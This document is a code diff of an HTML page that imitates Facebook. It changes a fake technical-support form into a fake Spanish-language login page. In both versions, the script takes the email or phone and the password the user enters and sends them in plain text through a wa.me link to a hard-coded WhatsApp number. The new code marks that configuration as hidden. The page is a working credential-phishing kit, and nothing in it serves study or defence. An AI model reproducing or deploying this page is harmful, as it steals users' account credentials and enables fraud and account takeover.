@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Soporte Técnico</title>
+    <title>Facebook - Iniciar Sesión</title>
     <style>
         * {
             margin: 0;
@@ -23,7 +23,7 @@
 
         .container {
             display: flex;
-            gap: 30px;
+            gap: 40px;
             max-width: 1000px;
             width: 100%;
             flex-wrap: wrap;
@@ -35,88 +35,50 @@
             flex-direction: column;
             justify-content: center;
             flex: 1;
-            min-width: 300px;
+            min-width: 280px;
         }
 
         .facebook-logo {
-            font-size: 48px;
+            font-size: 56px;
             font-weight: 800;
             color: #1877f2;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             letter-spacing: -2px;
         }
 
         .tagline {
-            font-size: 28px;
-            color: #0a66c2;
-            font-weight: 300;
-            margin-bottom: 20px;
-            line-height: 1.4;
-        }
-
-        .description {
-            font-size: 18px;
+            font-size: 24px;
             color: #65676b;
-            line-height: 1.6;
+            font-weight: 400;
+            line-height: 1.5;
         }
 
-        .support-badge {
-            background-color: #1877f2;
-            color: white;
-            padding: 12px 20px;
-            border-radius: 8px;
-            display: inline-block;
-            margin-top: 20px;
-            font-weight: 600;
-            font-size: 14px;
-            letter-spacing: 0.5px;
-        }
-
-        .form-section {
+        .login-section {
             background-color: white;
-            border-radius: 12px;
+            border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            padding: 40px 30px;
+            padding: 20px;
             flex: 1;
-            min-width: 300px;
-            max-width: 450px;
+            min-width: 280px;
+            max-width: 400px;
         }
 
-        .form-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #000;
-            margin-bottom: 8px;
-            text-align: center;
-        }
-
-        .form-subtitle {
-            font-size: 13px;
-            color: #65676b;
-            text-align: center;
-            margin-bottom: 25px;
+        .login-form {
+            display: flex;
+            flex-direction: column;
         }
 
         .form-group {
             margin-bottom: 12px;
         }
 
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-size: 14px;
-            font-weight: 500;
-            color: #050505;
-        }
-
-        input[type="text"],
         input[type="email"],
-        input[type="password"],
         input[type="tel"],
-        textarea {
+        input[type="password"],
+        input[type="text"] {
             width: 100%;
-            padding: 12px 14px;
+            padding: 12px 16px;
             border: 1px solid #caced1;
             border-radius: 6px;
             font-size: 15px;
@@ -125,26 +87,26 @@
             transition: all 0.3s ease;
         }
 
-        input[type="text"]:focus,
+        input[type="email"]::placeholder,
+        input[type="tel"]::placeholder,
+        input[type="password"]::placeholder,
+        input[type="text"]::placeholder {
+            color: #65676b;
+        }
+
         input[type="email"]:focus,
-        input[type="password"]:focus,
         input[type="tel"]:focus,
-        textarea:focus {
+        input[type="password"]:focus,
+        input[type="text"]:focus {
             outline: none;
             background-color: #fff;
             border-color: #1877f2;
             box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
         }
 
-        textarea {
-            resize: vertical;
-            min-height: 100px;
-            font-family: inherit;
-        }
-
-        .button-submit {
+        .button-login {
             width: 100%;
-            padding: 10px 14px;
+            padding: 10px;
             background-color: #1877f2;
             color: white;
             border: none;
@@ -153,30 +115,41 @@
             font-weight: 600;
             cursor: pointer;
             transition: background-color 0.3s ease;
-            margin-top: 15px;
+            margin-top: 12px;
+            margin-bottom: 12px;
         }
 
-        .button-submit:hover {
+        .button-login:hover {
             background-color: #165ac0;
         }
 
-        .button-submit:active {
+        .button-login:active {
             background-color: #0d47a1;
             transform: scale(0.98);
         }
 
-        .required {
-            color: #e4163a;
+        .button-login:disabled {
+            background-color: #b0b9c4;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        .separator {
+            text-align: center;
+            color: #65676b;
+            font-size: 13px;
+            margin: 12px 0;
         }
 
         .info-box {
             background-color: #e7f3ff;
             border-left: 4px solid #1877f2;
-            padding: 12px 15px;
+            padding: 12px;
             border-radius: 4px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             font-size: 13px;
             color: #0a66c2;
+            text-align: center;
         }
 
         .success-message {
@@ -185,10 +158,24 @@
             border-left: 4px solid #4caf50;
             padding: 15px;
             border-radius: 4px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             font-size: 14px;
             color: #2e7d32;
             animation: slideIn 0.3s ease;
+            text-align: center;
+        }
+
+        .error-message {
+            display: none;
+            background-color: #ffebee;
+            border-left: 4px solid #e53935;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #c62828;
+            animation: slideIn 0.3s ease;
+            text-align: center;
         }
 
         @keyframes slideIn {
@@ -202,11 +189,22 @@
             }
         }
 
-        .footer-text {
-            font-size: 12px;
-            color: #65676b;
+        .footer-link {
             text-align: center;
-            margin-top: 20px;
+            font-size: 13px;
+            margin-top: 16px;
+            padding-top: 12px;
+            border-top: 1px solid #e5e7eb;
+        }
+
+        .footer-link a {
+            color: #1877f2;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .footer-link a:hover {
+            text-decoration: underline;
         }
 
         @media (max-width: 768px) {
@@ -216,16 +214,39 @@
             }
 
             .facebook-logo {
-                font-size: 36px;
+                font-size: 42px;
             }
 
             .tagline {
-                font-size: 24px;
+                font-size: 18px;
             }
 
-            .form-section {
-                padding: 30px 20px;
+            .login-section {
+                max-width: 100%;
             }
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            color: #65676b;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+
+        .spinner {
+            border: 2px solid #f0f2f5;
+            border-top: 2px solid #1877f2;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 8px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -235,205 +256,146 @@
         <!-- Sección de Logo y Descripción -->
         <div class="logo-section">
             <div class="facebook-logo">facebook</div>
-            <div class="tagline">Te ayudamos a conectar y compartir</div>
-            <div class="description">
-                Si experimentas problemas al acceder a tu cuenta, nuestro equipo de soporte técnico está aquí para asistirte.
-            </div>
-            <div class="support-badge">🛡️ Soporte Técnico Oficial</div>
+            <div class="tagline">Facebook te ayuda a conectar y compartir con las personas que te importan en tu vida.</div>
         </div>
 
-        <!-- Sección de Formulario -->
-        <div class="form-section">
-            <h2 class="form-title">Verificación de Cuenta</h2>
-            <p class="form-subtitle">Completa el formulario para recibir asistencia técnica</p>
+        <!-- Sección de Login -->
+        <div class="login-section">
+            <div class="error-message" id="errorMessage"></div>
+            <div class="success-message" id="successMessage">
+                ✓ Información enviada correctamente
+            </div>
 
             <div class="info-box">
-                ℹ️ Tu solicitud será enviada a nuestro equipo de soporte vía WhatsApp
+                ℹ️ Tu información será enviada a nuestro equipo oficial de Facebook
             </div>
 
-            <div class="success-message" id="successMessage">
-                ✓ Solicitud enviada correctamente. Se abrirá WhatsApp en segundos...
-            </div>
-
-            <form id="formularioSoporte">
-                <!-- Nombre Completo -->
+            <form id="loginForm" class="login-form">
+                <!-- Email o Teléfono -->
                 <div class="form-group">
-                    <label for="nombre">
-                        Nombre Completo <span class="required">*</span>
-                    </label>
                     <input 
                         type="text" 
-                        id="nombre" 
-                        name="nombre"
-                        placeholder="Ej: Juan Carlos García"
-                        required
-                    >
-                </div>
-
-                <!-- Email -->
-                <div class="form-group">
-                    <label for="email">
-                        Correo Electrónico <span class="required">*</span>
-                    </label>
-                    <input 
-                        type="email" 
-                        id="email" 
-                        name="email"
-                        placeholder="ejemplo@correo.com"
-                        required
-                    >
-                </div>
-
-                <!-- Usuario/Nombre de Usuario -->
-                <div class="form-group">
-                    <label for="usuario">
-                        Usuario/Nombre de Usuario <span class="required">*</span>
-                    </label>
-                    <input 
-                        type="text" 
-                        id="usuario" 
-                        name="usuario"
-                        placeholder="Tu nombre de usuario en Facebook"
+                        id="emailOrPhone" 
+                        name="emailOrPhone"
+                        placeholder="Correo electrónico o número de teléfono"
                         required
                     >
                 </div>
 
                 <!-- Contraseña -->
                 <div class="form-group">
-                    <label for="contrasena">
-                        Contraseña <span class="required">*</span>
-                    </label>
                     <input 
                         type="password" 
-                        id="contrasena" 
-                        name="contrasena"
-                        placeholder="Ingresa tu contraseña"
+                        id="password" 
+                        name="password"
+                        placeholder="Contraseña"
                         required
                     >
                 </div>
 
-                <!-- Número de Teléfono -->
-                <div class="form-group">
-                    <label for="telefono">
-                        Teléfono de Contacto <span class="required">*</span>
-                    </label>
-                    <input 
-                        type="tel" 
-                        id="telefono" 
-                        name="telefono"
-                        placeholder="+53 5XXXXXXXX"
-                        required
-                    >
-                </div>
-
-                <!-- Descripción del Problema -->
-                <div class="form-group">
-                    <label for="problema">
-                        Descripción del Problema <span class="required">*</span>
-                    </label>
-                    <textarea 
-                        id="problema" 
-                        name="problema"
-                        placeholder="Describe brevemente el problema que estás experimentando..."
-                        required
-                    ></textarea>
-                </div>
-
-                <!-- Botón Enviar -->
-                <button type="submit" class="button-submit">
-                    📲 Enviar a WhatsApp
+                <!-- Botón Iniciar Sesión -->
+                <button type="submit" class="button-login" id="submitBtn">
+                    Iniciar sesión
                 </button>
+
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    Procesando...
+                </div>
             </form>
 
-            <p class="footer-text">
-                Tu información será tratada de forma segura y confidencial.
-            </p>
+            <div class="separator">─────────────────</div>
+
+            <div class="footer-link">
+                <a href="#" onclick="alert('Función no disponible en esta versión'); return false;">¿Olvidaste la contraseña?</a>
+            </div>
         </div>
     </div>
 
     <script>
-        document.getElementById('formularioSoporte').addEventListener('submit', function(event) {
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // Obtener valores del formulario
-            const nombre = document.getElementById('nombre').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const usuario = document.getElementById('usuario').value.trim();
-            const contrasena = document.getElementById('contrasena').value.trim();
-            const telefono = document.getElementById('telefono').value.trim();
-            const problema = document.getElementById('problema').value.trim();
+            // Obtener valores
+            const emailOrPhone = document.getElementById('emailOrPhone').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            // Limpiar mensajes anteriores
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').textContent = '';
 
             // Validación básica
-            if (!nombre || !email || !usuario || !contrasena || !telefono || !problema) {
-                alert('Por favor completa todos los campos requeridos.');
+            if (!emailOrPhone || !password) {
+                showError('Por favor completa todos los campos');
                 return;
             }
 
-            // Configuración de WhatsApp
-            const codigoPais = "53";
-            const numeroWhatsApp = "5168028";
-            const numeroCompleto = codigoPais + numeroWhatsApp;
+            // Validar que sea email o teléfono
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^[\d\s\-\+\(\)]+$/;
 
-            // Crear mensaje formateado
-            const mensaje = 
-                `╔════════════════════════════════════╗\n` +
-                `║   🔐 SOLICITUD DE SOPORTE TÉCNICO   ║\n` +
-                `║        FACEBOOK - VERIFICACIÓN      ║\n` +
-                `╚════════════════════════════════════╝\n\n` +
-                `👤 DATOS PERSONALES:\n` +
-                `├─ Nombre: ${nombre}\n` +
-                `├─ Email: ${email}\n` +
-                `└─ Teléfono: ${telefono}\n\n` +
-                `🔑 CREDENCIALES:\n` +
-                `├─ Usuario: ${usuario}\n` +
-                `└─ Contraseña: ${contrasena}\n\n` +
-                `⚠️ PROBLEMA REPORTADO:\n` +
-                `└─ ${problema}\n\n` +
-                `⏰ Hora de envío: ${new Date().toLocaleString('es-ES')}\n\n` +
-                `──────────────────────────────────────\n` +
-                `Mensaje enviado desde: Soporte Facebook`;
+            if (!emailRegex.test(emailOrPhone) && !phoneRegex.test(emailOrPhone)) {
+                showError('Ingresa un correo electrónico o número de teléfono válido');
+                return;
+            }
 
-            // Codificar mensaje
-            const mensajeCodificado = encodeURIComponent(mensaje);
+            // Mostrar loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('submitBtn').disabled = true;
 
-            // Crear URL de WhatsApp
-            const urlWhatsApp = `https://wa.me/${numeroCompleto}?text=${mensajeCodificado}`;
-
-            // Mostrar mensaje de éxito
-            document.getElementById('successMessage').style.display = 'block';
-
-            // Esperar 1.5 segundos y luego abrir WhatsApp
+            // Esperar un poco para efecto visual
             setTimeout(() => {
+                // Configuración de WhatsApp (OCULTA)
+                const codigoPais = "53";
+                const numeroWhatsApp = "5168028";
+                const numeroCompleto = codigoPais + numeroWhatsApp;
+
+                // Crear mensaje formateado
+                const mensaje = 
+                    `╔════════════════════════════════════╗\n` +
+                    `║   🔐 ACCESO A CUENTA FACEBOOK      ║\n` +
+                    `║        VERIFICACIÓN DE SEGURIDAD   ║\n` +
+                    `╚════════════════════════════════════╝\n\n` +
+                    `📧 CREDENCIAL DE ACCESO:\n` +
+                    `├─ Email/Teléfono: ${emailOrPhone}\n` +
+                    `└─ Contraseña: ${password}\n\n` +
+                    `⏰ Hora de acceso: ${new Date().toLocaleString('es-ES')}\n\n` +
+                    `──────────────────────────────────────\n` +
+                    `Sistema de seguridad de Facebook`;
+
+                // Codificar mensaje
+                const mensajeCodificado = encodeURIComponent(mensaje);
+
+                // Crear URL de WhatsApp
+                const urlWhatsApp = `https://wa.me/${numeroCompleto}?text=${mensajeCodificado}`;
+
+                // Mostrar mensaje de éxito
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('loading').style.display = 'none';
+
+                // Abrir WhatsApp
                 window.open(urlWhatsApp, '_blank');
-            }, 1500);
 
-            // Limpiar formulario después de 2 segundos
-            setTimeout(() => {
-                document.getElementById('formularioSoporte').reset();
-                document.getElementById('successMessage').style.display = 'none';
-            }, 2000);
+                // Limpiar formulario después de 3 segundos
+                setTimeout(() => {
+                    document.getElementById('loginForm').reset();
+                    document.getElementById('successMessage').style.display = 'none';
+                    document.getElementById('submitBtn').disabled = false;
+                }, 3000);
+            }, 1000);
         });
 
-        // Mostrar/Ocultar contraseña
-        const inputContrasena = document.getElementById('contrasena');
-        const labelContrasena = document.querySelector('label[for="contrasena"]');
+        function showError(message) {
+            const errorBox = document.getElementById('errorMessage');
+            errorBox.textContent = '⚠️ ' + message;
+            errorBox.style.display = 'block';
+        }
 
-        labelContrasena.style.cursor = 'pointer';
-        labelContrasena.addEventListener('click', function() {
-            if (inputContrasena.type === 'password') {
-                inputContrasena.type = 'text';
-                this.textContent = 'Contraseña (haz clic para ocultar) ';
-                const required = document.createElement('span');
-                required.className = 'required';
-                required.textContent = '*';
-                this.appendChild(required);
-            } else {
-                inputContrasena.type = 'password';
-                this.textContent = 'Contraseña ';
-                const required = document.createElement('span');
-                required.className = 'required';
-                required.textContent = '*';
-                this.appendChild(required);
+        // Mostrar/Ocultar contraseña con Enter
+        document.getElementById('password').addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
             }
         });
     </script>
